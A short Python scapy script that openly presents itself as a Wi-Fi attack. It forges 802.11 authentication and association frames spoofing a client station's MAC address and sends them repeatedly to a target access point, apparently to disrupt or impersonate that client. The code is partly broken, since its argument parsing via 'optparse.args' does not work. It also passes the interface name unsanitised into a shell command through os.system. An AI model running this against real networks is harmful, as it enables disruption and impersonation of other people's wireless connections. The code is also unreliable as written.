from scapy.all import *
import optparse
import os

conf.verb = 0

ap = optparse.args.ap
sta = optparse.args.sta
ssid = optparse.args.ssid
ch = optparse.args.ch
iface = optparse.args.iface
 
ALGO_OPEN_AUTH = 0  # OPN
START_SEQNUM = 1  # sequence number
SYSTEM_STR = "[\x1b[36m*\x1b[0m]"
WARN_STR = "[\x1b[31m!\x1b[0m]"
INFO_STR = "\x1b[33m-\x1b[0m"

def auth_attack():
    os.system('clear')
    # Channel Switching
    channel_switch(iface, ch)
    show_info()

    # Authentication
    frame1 = RadioTap()\
        /Dot11(type=0, subtype=11, addr1=ap, addr2=sta, addr3=ap)\
        /Dot11Auth(algo=ALGO_OPEN_AUTH, seqnum=START_SEQNUM)
 
    # Association
    frame2 = RadioTap()\
        /Dot11(type=0, subtype=0, addr1=ap, addr2=sta, addr3=ap)\
        /Dot11AssoReq()\
        /Dot11Elt(ID='SSID', info=ssid)
    
    print(WARN_STR+" Attack")
    for i in range(0,30):
        sendp(frame1, iface=iface)
        sendp(frame2, iface=iface)
        print("\x1b[36m->\x1b[0m",end="",flush=True)

def channel_switch(iface,ch):
    print(WARN_STR+" Channel Switching : Ch."+str(ch))
    os.system('iwconfig ' + iface + ' channel ' + str(ch))

def show_info():
    print(SYSTEM_STR+" Information")
    print("\t"+INFO_STR+" Access Point MAC Address (BSSID) : %s" % ap)
    print("\t"+INFO_STR+" Station MAC Address : %s" % sta)
    print("\t"+INFO_STR+" SSID Information : %s" % ssid)
    print("\t"+INFO_STR+" Channel : Ch.%s" % ch)
    print("\t"+INFO_STR+" Interface : %s" % iface)

if __name__=='__main__':
    auth_attack()

